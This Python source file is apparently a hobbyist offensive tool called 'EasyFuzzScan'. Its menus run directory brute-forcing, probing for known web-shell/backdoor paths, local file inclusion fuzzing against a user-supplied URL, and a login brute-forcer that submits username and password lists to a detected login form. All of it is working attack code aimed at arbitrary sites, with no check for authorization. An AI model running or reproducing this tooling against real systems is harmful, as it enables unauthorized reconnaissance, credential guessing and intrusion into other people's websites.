from PIL import Image
import os
import requests
import sys
import time
from urllib.parse import urlparse
from bs4 import BeautifulSoup

# ANSI escape codes for colors
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
RESET = '\033[0m'

# Common sensitive paths to detect high vulnerabilities
SENSITIVE_PATHS = ["admin", "login", "config", "db", "database", "passwd", "private", "backup"]

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def animate_loading(duration=2):
    spinner = ['/', '-', '\\', '|']
    end_time = time.time() + duration
    while time.time() < end_time:
        for symbol in spinner:
            sys.stdout.write(f"\r{symbol} Loading...")
            sys.stdout.flush()
            time.sleep(0.1)

if __name__ == "__main__":
    animate_loading()


def print_with_fade_in(text, delay=0.005):
    """Print text with a fade-in effect."""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()  # Move to the next line

def main_menu():
    clear_screen()
    
    # Define the text for the menu
    menu_text = r"""
          
    >>================================================================<<
    || _____                _____               ____                  ||
    ||| ____|__ _ ___ _   _|  ___|   _ ________/ ___|  ___ __ _ _ __  ||
    |||  _| / _` / __| | | | |_ | | | |_  /_  /\___ \ / __/ _` | '_ \ ||
    ||| |__| (_| \__ \ |_| |  _|| |_| |/ / / /  ___) | (_| (_| | | | |||
    |||_____\__,_|___/\__, |_|   \__,_/___/___||____/ \___\__,_|_| |_|||
    ||                |___/                                           ||
    >>================================================================<<    
    
                                                                                            
    Welcome to EasyFuzzScan Script here you can choose a lot of things!
    Made By: https://github.com/awiones

    [1] Scan Directory 
    [2] Common Backdoor
    [3] LFI test
    [4] Crack the code!
    [0] Exit
    """

    # Print the menu text with fade-in effect
    print_with_fade_in(menu_text)
    
    choice = input("\nPick one: ").strip()
    clear_screen()
    return choice


def scan_directory():
    while True:
        clear_screen()
        print(r"""
    
    >>================================================================<<
    || _____                _____               ____                  ||
    ||| ____|__ _ ___ _   _|  ___|   _ ________/ ___|  ___ __ _ _ __  ||
    |||  _| / _` / __| | | | |_ | | | |_  /_  /\___ \ / __/ _` | '_ \ ||
    ||| |__| (_| \__ \ |_| |  _|| |_| |/ / / /  ___) | (_| (_| | | | |||
    |||_____\__,_|___/\__, |_|   \__,_/___/___||____/ \___\__,_|_| |_|||
    ||                |___/                                           ||
    >>================================================================<<

    Welcome to EasyFuzzScan Script here you can choose a lot of things!
    Made by: https://github.com/awiones
    """)
        print("[1] Scan Directory has been selected!")
        print("    1. Scan with small file!")
        print("    2. Scan with Medium file!")
        print("    3. Scan with Large file!")
        print("[0] Back to main menu")
        choice = input("\nPick one: ").strip()

        if choice == "0":
            break

        file_choice = {
            "1": "Directory/small.txt",
            "2": "Directory/medium.txt",
            "3": "Directory/large.txt"
        }.get(choice, None)

        if file_choice:
            print(f"\n[1] You have selected {os.path.basename(file_choice).replace('.txt', '').capitalize()} file! Now give the URL and we'll search the link!")
            url = input("Type here: ").strip()
            if not url.startswith("http://") and not url.startswith("https://"):
                url = "https://" + url

            if os.path.isfile(file_choice):
                save_results = input("\nWould you like to save the scan results? (yes/no): ").strip().lower()
                if save_results == 'yes':
                    use_default_folder = input("\nWould you like to save the results in the default folder 'results'? (yes/no): ").strip().lower()
                    if use_default_folder == 'yes':
                        results_folder = "results"
                    else:
                        results_folder = input("\nWhere would you like to save the results? Type the folder path: ").strip()
                else:
                    results_folder = None

                if results_folder:
                    os.makedirs(results_folder, exist_ok=True)
                    domain = urlparse(url).netloc.replace("www.", "")
                    result_file = os.path.join(results_folder, f"{domain}.txt")
                else:
                    result_file = None

                scan_url_with_file(url, file_choice, result_file)
            else:
                print(f"\nError: The file '{file_choice}' was not found.")
        else:
            print("Invalid choice! Please pick a valid option or press '0' to go back.")

        input("\nPress Enter to continue...")

def scan_url_with_file(base_url, file_name, result_file=None):
    spinner = ['/', '-', '\\', '|']
    spinner_idx = 0
    print(f"\nStarting scan for {base_url} using {file_name}...\n")
    with open(file_name, 'r') as file:
        results = []
        for line in file:
            directory = line.strip()
            full_url = base_url.rstrip('/') + '/' + directory
            try:
                # Animation: Updating the spinner
                sys.stdout.write(f"Here is scanning... {spinner[spinner_idx % len(spinner)]}\r")
                sys.stdout.flush()
                spinner_idx += 1
                time.sleep(0.1)  # Adjust the speed of the spinner here

                response = requests.get(full_url, timeout=5)
                if response.status_code == 200:
                    result = f"{GREEN}We sniffed something | {full_url} | It was GET and 200 Found!{RESET}"
                    print(result)
                    results.append(result)
                elif response.status_code == 301:
                    result = f"{YELLOW}We sniffed something | {full_url} | It was GET and 301 Redirected (Unauthorized)!{RESET}"
                    print(result)
                    results.append(result)
                elif any(path in directory for path in SENSITIVE_PATHS):
                    result = f"{RED}Oh no! This is a high vuln! | {full_url} | Check this out!{RESET}"
                    print(result)
                    results.append(result)
            except requests.RequestException as e:
                print(f"Error accessing {full_url}: {e}")
            except KeyboardInterrupt:
                print("\nScan interrupted by user.")
                break

        if result_file:
            with open(result_file, 'w') as rf:
                rf.write("\n".join(results))
            print(f"\nResults saved to {result_file}")

def common_backdoor_test():
    while True:
        clear_screen()
        print(r""""
              
        >>================================================================<<
        || _____                _____               ____                  ||
        ||| ____|__ _ ___ _   _|  ___|   _ ________/ ___|  ___ __ _ _ __  ||
        |||  _| / _` / __| | | | |_ | | | |_  /_  /\___ \ / __/ _` | '_ \ ||
        ||| |__| (_| \__ \ |_| |  _|| |_| |/ / / /  ___) | (_| (_| | | | |||
        |||_____\__,_|___/\__, |_|   \__,_/___/___||____/ \___\__,_|_| |_|||
        ||                |___/                                           ||
        >>================================================================<<
        
        Made by: https://github.com/awiones
        
        Select Backdoor Type:
        [1] PHP
        [2] ASP
        [3] Perl
        [4] JSP
        [0] Go Back to Main Menu
        """)
        choice = input("\nPick one: ").strip()

        if choice == "0":
            break

        file_choice = {
            "1": "Backdoor/PHP.txt",
            "2": "Backdoor/ASP.txt",
            "3": "Backdoor/PL.txt",
            "4": "Backdoor/JSP.txt"
        }.get(choice, None)

        if file_choice:
            url = input("\nEnter the URL to scan: ").strip()
            if not url.startswith("http://") and not url.startswith("https://"):
                url = "https://" + url

            if os.path.isfile(file_choice):
                save_results = input("\nWould you like to save the scan results? (yes/no): ").strip().lower()
                if save_results == 'yes':
                    use_default_folder = input("\nWould you like to save the results in the default folder 'results'? (yes/no): ").strip().lower()
                    if use_default_folder == 'yes':
                        results_folder = "results"
                    else:
                        results_folder = input("\nWhere would you like to save the results? Type the folder path: ").strip()
                else:
                    results_folder = None

                if results_folder:
                    os.makedirs(results_folder, exist_ok=True)
                    domain = urlparse(url).netloc.replace("www.", "")
                    result_file = os.path.join(results_folder, f"Backdoor_{domain}.txt")
                else:
                    result_file = None

                scan_backdoor(url, file_choice, result_file)
            else:
                print(f"\nError: The file '{file_choice}' was not found.")
        else:
            print("Invalid choice! Please pick a valid option or press '0' to go back.")

        input("\nPress Enter to continue...")

def scan_backdoor(base_url, file_name, result_file=None):
    spinner = ['/', '-', '\\', '|']
    spinner_idx = 0
    print(f"\nStarting scan for {base_url} using {file_name}...\n")
    with open(file_name, 'r') as file:
        results = []
        for line in file:
            directory = line.strip()
            full_url = base_url.rstrip('/') + '/' + directory
            try:
                # Animation: Updating the spinner
                sys.stdout.write(f"Here is scanning... {spinner[spinner_idx % len(spinner)]}\r")
                sys.stdout.flush()
                spinner_idx += 1
                time.sleep(0.1)  # Adjust the speed of the spinner here

                response = requests.get(full_url, timeout=5)
                if response.status_code == 200:
                    result = f"{GREEN}Found 200 OK | {full_url}{RESET}"
                    print(result)
                    results.append(result)
            except requests.RequestException as e:
                print(f"Error accessing {full_url}: {e}")
            except KeyboardInterrupt:
                print("\nScan interrupted by user.")
                break

        if result_file:
            with open(result_file, 'w') as rf:
                rf.write("\n".join(results))
            print(f"\nResults saved to {result_file}")
            
        
def lfi_fuzzing_menu():
    while True:
        clear_screen()
        print(r""""
              
        >>================================================================<<
        || _____                _____               ____                  ||
        ||| ____|__ _ ___ _   _|  ___|   _ ________/ ___|  ___ __ _ _ __  ||
        |||  _| / _` / __| | | | |_ | | | |_  /_  /\___ \ / __/ _` | '_ \ ||
        ||| |__| (_| \__ \ |_| |  _|| |_| |/ / / /  ___) | (_| (_| | | | |||
        |||_____\__,_|___/\__, |_|   \__,_/___/___||____/ \___\__,_|_| |_|||
        ||                |___/                                           ||
        >>================================================================<< 
                                                                                              
        You selected LFI testing, now give us the link! And don't forget to put FUZZ in the end!
        Made by: https://github.com/awiones
       
        """)
        url = input("Enter the URL (or '0' to go back): ").strip()

        if url == '0':
            return  # Go back to the main menu

        if 'FUZZ' not in url:
            print(RED + "Error: The URL must contain 'FUZZ' placeholder. Please try again." + RESET)
            print("Example: https://example.com/FUZZ")
            input("Press Enter to continue...")
            continue

        lfi_wordlist = "Fuzz/LFI.txt"  # Wordlist for LFI fuzzing

        # Prompt the user to save the results
        save_results = input("\nWould you like to save the scan results? (yes/no): ").strip().lower()
        if save_results == 'yes':
            use_default_folder = input("\nWould you like to save the results in the default folder 'results'? (yes/no): ").strip().lower()
            if use_default_folder == 'yes':
                results_folder = "results"
            else:
                results_folder = input("\nWhere would you like to save the results? Type the folder path: ").strip()
        else:
            results_folder = None

        if results_folder:
            os.makedirs(results_folder, exist_ok=True)
            domain = urlparse(url).netloc.replace("www.", "")
            result_file = os.path.join(results_folder, f"LFI_{domain}.txt")
        else:
            result_file = None

        perform_lfi_fuzzing(url, lfi_wordlist, result_file)

def perform_lfi_fuzzing(url, wordlist_file, result_file=None):
    try:
        # Open the wordlist with explicit UTF-8 encoding
        with open(wordlist_file, 'r', encoding='utf-8') as file:
            fuzz_paths = file.read().splitlines()
        
        print(f"Starting LFI Fuzzing with {wordlist_file}...")
        results = []
        spinner = ['/', '-', '\\', '|']
        spinner_idx = 0

        for path in fuzz_paths:
            fuzzed_url = url.replace("FUZZ", path)
            try:
                # Animation: Updating the spinner
                sys.stdout.write(f"Fuzzing... {spinner[spinner_idx % len(spinner)]}\r")
                sys.stdout.flush()
                spinner_idx += 1
                time.sleep(0.1)  # Adjust the speed of the spinner here

                response = requests.get(fuzzed_url, timeout=5)
                if response.status_code == 200:
                    result = f"{GREEN}Found 200 OK | {fuzzed_url}{RESET}"
                    print(result)
                    results.append(result)
                elif response.status_code == 301:
                    result = f"{YELLOW}Found 301 Moved Permanently | {fuzzed_url}{RESET}"
                    print(result)
                    results.append(result)
                elif response.status_code == 404:
                    # Ignore 404 Not Found
                    continue
                else:
                    print(f"Other Status: {fuzzed_url} (Status: {response.status_code})")
            except requests.RequestException as e:
                print(f"Error accessing {fuzzed_url}: {e}")
            except KeyboardInterrupt:
                print("\nFuzzing interrupted by user.")
                break

        if result_file and results:
            with open(result_file, 'w', encoding='utf-8') as rf:
                rf.write("\n".join(results))
            print(f"\nResults saved to {result_file}")
        else:
            print("\nNo results to save.")
        
        input("Press Enter to continue...")
    except Exception as e:
        print(RED + f"Error: {e}" + RESET)
        input("Press Enter to continue...")


def crack_the_code():
    clear_screen()
    print(r"""
          
        >>================================================================<<
        || _____                _____               ____                  ||
        ||| ____|__ _ ___ _   _|  ___|   _ ________/ ___|  ___ __ _ _ __  ||
        |||  _| / _` / __| | | | |_ | | | |_  /_  /\___ \ / __/ _` | '_ \ ||
        ||| |__| (_| \__ \ |_| |  _|| |_| |/ / / /  ___) | (_| (_| | | | |||
        |||_____\__,_|___/\__, |_|   \__,_/___/___||____/ \___\__,_|_| |_|||
        ||                |___/                                           ||
        >>================================================================<<
          
        Made by: https://github.com/awiones  
        """)
    print("[4] Crack the code has been selected!")
    
    url = input("Enter the URL of the login page: ").strip()
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url
    
    try:
        # Check if the page contains a login form
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Look for form elements with 'login' or 'password' in them
        forms = soup.find_all('form')
        login_form = None
        
        for form in forms:
            if form.find('input', {'type': 'password'}) or 'login' in form.get('action', '').lower():
                login_form = form
                break
        
        if login_form is None:
            print(RED + "Not a login website, duh!" + RESET)
            input("Press Enter to continue...")
            return

        print(GREEN + "Login form detected!" + RESET)
        
        # Prompt for username and password files
        username_file = input("\nPut your username possible file here: ").strip()
        password_file = input("\nPut your password possible file here: ").strip()
        
        if not os.path.isfile(username_file) or not os.path.isfile(password_file):
            print(RED + "Error: One or both files not found." + RESET)
            input("Press Enter to continue...")
            return

        # Extract the form's action URL (relative or absolute)
        action_url = login_form.get('action')
        if not action_url.startswith('http'):
            action_url = url.rstrip('/') + '/' + action_url.lstrip('/')

        # Extract the form method (GET or POST)
        method = login_form.get('method', 'post').lower()

        # Extract form fields
        inputs = login_form.find_all('input')
        form_data = {inp.get('name'): inp.get('value', '') for inp in inputs if inp.get('name')}

        with open(username_file, 'r') as uf, open(password_file, 'r') as pf:
            usernames = uf.read().splitlines()
            passwords = pf.read().splitlines()

            print(f"\nStarting brute force on {url}...\n")
            for username in usernames:
                for password in passwords:
                    # Update the form data with current username and password
                    form_data.update({'username': username, 'password': password})
                    
                    if method == 'post':
                        response = requests.post(action_url, data=form_data)
                    else:
                        response = requests.get(action_url, params=form_data)
                    
                    # Check if login was successful (e.g., by checking response content)
                    if "login failed" not in response.text.lower():
                        print(GREEN + f"Success! Username: {username} | Password: {password}" + RESET)
                        input("Press Enter to continue...")
                        return
                    else:
                        print(RED + f"Failed attempt: {username} | {password}" + RESET)
        
        print(RED + "\nBrute force attack completed. No valid credentials found." + RESET)
        input("Press Enter to continue...")
    
    except Exception as e:
        print(RED + f"Error: {e}" + RESET)
        input("Press Enter to continue...")

def exit_program():
    clear_screen()

    # Open the image file
    image_path = "exit.jpg"
    if os.path.isfile(image_path):
        try:
            img = Image.open(image_path)
            img.show()  # Opens the image in the default image viewer
        except Exception as e:
            print(f"Error opening image: {e}")
    else:
        print("Image file not found.")

    # Print exit message
    print("\nExiting... Goodbye!")
    sys.exit(0)



def invalid_choice():
    print("Invalid choice! Please select a valid option.")

if __name__ == "__main__":
    while True:
        choice = main_menu()
        if choice == "1":
            scan_directory()
        elif choice == "2":
            common_backdoor_test()
        elif choice == "3":
            lfi_fuzzing_menu()
        elif choice == "4":
            crack_the_code()
        elif choice == "0":
            exit_program()
        else:
            invalid_choice()

        input("\nPress Enter to return to the main menu...")
